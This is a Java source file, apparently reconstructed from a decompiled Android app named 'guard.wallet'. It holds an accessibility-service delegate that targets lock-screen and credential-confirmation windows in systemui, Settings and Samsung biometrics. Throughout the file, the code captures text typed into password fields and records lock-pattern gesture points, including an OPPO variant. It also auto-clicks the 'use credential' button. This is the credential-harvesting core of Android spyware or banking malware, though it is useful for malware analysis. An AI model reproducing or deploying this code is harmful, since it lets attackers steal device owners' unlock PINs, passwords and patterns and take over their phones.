package com.guard.wallet.delegate;

import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.condition.TargetActionCondition;

import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.req.EventSubscribe;
import com.guard.wallet.req.ListenWindow;
import java.util.HashSet;
import java.util.LinkedList;
import java.util.Objects;

/**
 * vendor o/h — ConfirmDeviceCredentialDelegate.
 * Monitors credential/biometric auth windows across 3 packages:
 *   - com.android.systemui
 *   - com.android.settings
 *   - com.samsung.android.biometrics.app.setting
 * Each package has 4 ListenWindow types (R, J, I, K) × 3 packages = 12 windows.
 * Event subscriptions: Q (use credential btn), N (password edit), O (lock pattern), P (OPPO lock pattern).
 */
public final class ConfirmDeviceCredentialDelegate extends AccessibilityDelegate {

    public ConfirmDeviceCredentialDelegate() {
        super(M(), "com.android.systemui");
    }

    // ═══════ Filter builders ═══════

    /**
     * vendor H(packageName) — build CombineFilter for "use credential" button.
     * Matches: className=TextView, id={pkg}:id/button_use_credential
     */
    public static CombineFilter H(String pkg) {
        CombineFilter filter = new CombineFilter();
        StringCondition idCond = FilterHelper.addCondition(filter,
                FilterHelper.initFilter(filter, "className", "android.widget.TextView"), "id");
        idCond.setEquals(pkg.concat(":id/button_use_credential"));
        filter.getStringConditions().add(idCond);
        return filter;
    }

    /**
     * vendor L(packageName) — build CombineFilter for title TextView.
     * Matches: className=TextView, id={pkg}:id/title
     */
    public static CombineFilter L(String pkg) {
        CombineFilter filter = new CombineFilter();
        StringCondition idCond = FilterHelper.addCondition(filter,
                FilterHelper.initFilter(filter, "className", "android.widget.TextView"), "id");
        idCond.setEquals(pkg.concat(":id/title"));
        filter.getStringConditions().add(idCond);
        return filter;
    }

    // ═══════ ListenWindow builders ═══════

    /**
     * vendor I(packageName) — ListenWindow for ConfirmDeviceCredential (no specific activity).
     * Has title match, 3 event types (32, 2048, 16384), 4 event subscriptions.
     */
    public static ListenWindow I(String pkg) {
        ListenWindow lw = new ListenWindow(pkg, null);
        lw.setId("confirmDeviceCredentialNoneWithSubscribes:".concat(pkg));
        lw.setMatchs(new LinkedList<>());
        lw.getMatchs().add(L(pkg));
        lw.setEventTypes(new HashSet<>());
        FilterHelper.addEventType(16384, FilterHelper.addEventType(2048, FilterHelper.addEventType(32, lw.getEventTypes(), lw), lw), lw);
        lw.getEventSubscribes().add(Q(pkg));
        lw.getEventSubscribes().add(N(pkg));
        lw.getEventSubscribes().add(O(pkg));
        lw.getEventSubscribes().add(P(pkg));
        return lw;
    }

    /**
     * vendor J(packageName) — ListenWindow for ConfirmDeviceCredentialActivity.
     * Has title match, 3 event types (32, 2048, 16384), 4 event subscriptions.
     */
    public static ListenWindow J(String pkg) {
        ListenWindow lw = new ListenWindow(pkg,
                "com.android.settings.password.ConfirmDeviceCredentialActivity");
        lw.setId("confirmDeviceCredentialWithSubscribes:".concat(pkg));
        lw.setMatchs(new LinkedList<>());
        lw.getMatchs().add(L(pkg));
        lw.setEventTypes(new HashSet<>());
        FilterHelper.addEventType(16384, FilterHelper.addEventType(2048, FilterHelper.addEventType(32, lw.getEventTypes(), lw), lw), lw);
        lw.getEventSubscribes().add(Q(pkg));
        lw.getEventSubscribes().add(N(pkg));
        lw.getEventSubscribes().add(O(pkg));
        lw.getEventSubscribes().add(P(pkg));
        return lw;
    }

    /**
     * vendor K(packageName) — ListenWindow for ConfirmLockPassword.
     * 3 event types (32, 2048, 16384), 2 event subscriptions (Q, N only).
     */
    public static ListenWindow K(String pkg) {
        ListenWindow lw = new ListenWindow(pkg,
                "com.android.settings.password.ConfirmLockPassword");
        lw.setId("confirmLockPasswordWithSubscribes:".concat(pkg));
        lw.setEventTypes(new HashSet<>());
        FilterHelper.addEventType(16384, FilterHelper.addEventType(2048, FilterHelper.addEventType(32, lw.getEventTypes(), lw), lw), lw);
        lw.getEventSubscribes().add(Q(pkg));
        lw.getEventSubscribes().add(N(pkg));
        return lw;
    }

    /**
     * vendor R(packageName) — ListenWindow for use-credential LinearLayout.
     * Has "use credential" button match, 3 event types, 1 event subscription (Q).
     */
    public static ListenWindow R(String pkg) {
        ListenWindow lw = new ListenWindow(pkg, "android.widget.LinearLayout");
        lw.setId("useCredentialLayoutWithSubscribes:".concat(pkg));
        lw.setMatchs(new LinkedList<>());
        lw.getMatchs().add(H(pkg));
        lw.setEventTypes(new HashSet<>());
        FilterHelper.addEventType(16384, FilterHelper.addEventType(2048, FilterHelper.addEventType(32, lw.getEventTypes(), lw), lw), lw);
        lw.getEventSubscribes().add(Q(pkg));
        return lw;
    }

    /**
     * vendor M() — build the full list of 12 ListenWindows (4 types × 3 packages).
     */
    public static LinkedList M() {
        LinkedList list = new LinkedList();
        list.add(R("com.android.systemui"));
        list.add(J("com.android.systemui"));
        list.add(I("com.android.systemui"));
        list.add(K("com.android.systemui"));
        list.add(R("com.android.settings"));
        list.add(J("com.android.settings"));
        list.add(I("com.android.settings"));
        list.add(K("com.android.settings"));
        list.add(R("com.samsung.android.biometrics.app.setting"));
        list.add(J("com.samsung.android.biometrics.app.setting"));
        list.add(I("com.samsung.android.biometrics.app.setting"));
        list.add(K("com.samsung.android.biometrics.app.setting"));
        return list;
    }

    // ═══════ EventSubscribe builders ═══════

    /**
     * vendor N(packageName) — password EditText subscribe.
     * Monitors text changes on EditText (event types 16, 8192).
     */
    public static EventSubscribe N(String pkg) {
        EventSubscribe sub = new EventSubscribe();
        sub.setId("lockPasswordEditSubscribe:".concat(pkg));
        sub.setListenType(1);
        sub.setSourceRule(0);
        CombineFilter filter = new CombineFilter();
        StringCondition classCond = FilterHelper.initFilter(filter, "className", "android.widget.EditText");
        filter.getStringConditions().add(classCond);
        sub.setCombineFilter(filter);
        sub.setListenProps(new LinkedList<>());
        sub.getListenProps().add("text");
        sub.setEventTypes(new HashSet<>());
        sub.getEventTypes().add(16);
        sub.getEventTypes().add(8192);
        return sub;
    }

    /**
     * vendor O(packageName) — lock pattern subscribe.
     * Monitors gesture points on lockPattern View (event types 32, 2048, 16384).
     */
    public static EventSubscribe O(String pkg) {
        EventSubscribe sub = new EventSubscribe();
        sub.setId("lockPatternSubscribe:".concat(pkg));
        sub.setListenType(1);
        sub.setSourceRule(0);
        CombineFilter filter = new CombineFilter();
        StringCondition idCond = FilterHelper.addCondition(filter,
                FilterHelper.initFilter(filter, "className", "android.view.View"), "id");
        idCond.setEquals(pkg.concat(":id/lockPattern"));
        filter.getStringConditions().add(idCond);
        sub.setCombineFilter(filter);
        sub.setListenProps(new LinkedList<>());
        sub.getListenProps().add("boundsInScreen");
        sub.getListenProps().add("boundsInParent");
        sub.getListenProps().add("GESTURE_POINTS");
        sub.setHelperProp("GESTURE_POINTS");
        sub.setListenHelper(true);
        sub.setEventTypes(new HashSet<>());
        sub.getEventTypes().add(32);
        sub.getEventTypes().add(2048);
        sub.getEventTypes().add(16384);
        return sub;
    }

    /**
     * vendor P(packageName) — OPPO biometric lock pattern subscribe.
     * Same as O() but matches biometric_lockPattern id.
     */
    public static EventSubscribe P(String pkg) {
        EventSubscribe sub = new EventSubscribe();
        sub.setId("oppoLockPatternSubscribe:".concat(pkg));
        sub.setListenType(1);
        sub.setSourceRule(0);
        CombineFilter filter = new CombineFilter();
        StringCondition idCond = FilterHelper.addCondition(filter,
                FilterHelper.initFilter(filter, "className", "android.view.View"), "id");
        idCond.setEquals(pkg.concat(":id/biometric_lockPattern"));
        filter.getStringConditions().add(idCond);
        sub.setCombineFilter(filter);
        sub.setListenProps(new LinkedList<>());
        sub.getListenProps().add("boundsInScreen");
        sub.getListenProps().add("boundsInParent");
        sub.getListenProps().add("GESTURE_POINTS");
        sub.setHelperProp("GESTURE_POINTS");
        sub.setListenHelper(true);
        sub.setEventTypes(new HashSet<>());
        sub.getEventTypes().add(32);
        sub.getEventTypes().add(2048);
        sub.getEventTypes().add(16384);
        return sub;
    }

    /**
     * vendor Q(packageName) — use credential button subscribe.
     * Auto-clicks the "use credential" button with reply action.
     */
    public static EventSubscribe Q(String pkg) {
        EventSubscribe sub = new EventSubscribe();
        sub.setId("useCredentialEventSubscribe:".concat(pkg));
        sub.setListenType(1);
        sub.setSourceRule(0);
        sub.setCombineFilter(H(pkg));
        sub.setEventTypes(new HashSet<>());
        sub.getEventTypes().add(32);
        sub.getEventTypes().add(2048);
        sub.getEventTypes().add(16384);
        TargetActionCondition action = new TargetActionCondition();
        action.setActionType(1);
        action.setActionName("click");
        sub.setReplyActions(new LinkedList<>());
        sub.getReplyActions().add(action);
        return sub;
    }

    // ═══════ Overrides ═══════

    @Override
    public final boolean equals(Object obj) {
        return obj instanceof ConfirmDeviceCredentialDelegate;
    }

    @Override
    public final int hashCode() {
        return Objects.hash(ConfirmDeviceCredentialDelegate.class.getName());
    }

    /** vendor u(event, pkg, cls) — pass-through to super */
    @Override
    public final void u(AccessibilityEvent event, String pkg, String cls) {
        super.u(event, pkg, cls);
    }
}
